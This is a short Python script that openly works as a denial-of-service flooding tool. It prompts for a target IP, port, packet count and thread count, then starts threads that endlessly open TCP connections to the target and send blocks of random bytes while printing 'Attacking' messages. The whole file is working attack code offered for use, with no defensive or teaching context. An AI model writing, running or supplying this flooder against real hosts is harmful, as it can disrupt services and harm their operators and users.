import random
import threading
import socket
import os
import time
from termcolor import colored


ip = str(input(colored("[+] IP : ",'green')))
port = int(input(colored("[+] Port : ",'green')))
packet = int(input(colored("[+] Packets : ",'green')))
thread = int(input(colored("[+] Threads : ",'green')))

time.sleep(1.5)

def sync() :
    hevin = random._urandom(900)
    bb = int(0)
    while True :
        try :
            h = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
            h.connect((ip,port))
            h.send(hevin)
            for i in range(packet):
                h.send(hevin)
            bb+=1
            print(colored('[+] Attacking '+ip+'>>>Sent: '+str(bb),'red'))
        except KeyboardInterrupt:
            h.close()
            print(colored("[+++] DONE !!!!",'green'))
            pass

for b in range(thread):
    thread = threading.Thread(target = sync)
    thread.start()        